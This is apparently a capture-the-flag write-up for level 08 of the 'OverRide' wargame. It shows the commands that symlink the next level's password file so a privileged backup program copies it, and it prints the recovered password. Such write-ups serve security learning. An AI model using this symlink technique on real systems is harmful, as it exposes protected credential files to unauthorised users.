# level 08

## get_binary

```shell
scp -P 4242 level08@192.168.0.0:/home/users/level08/level08 level08.bin
```

## Exploit

```shell
level08@OverRide:~$ chmod 777 .
level08@OverRide:~$ ln -s /home/users/level09/.pass flag
level08@OverRide:~$ ./level08 flag
level08@OverRide:~$ cat backups/flag 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
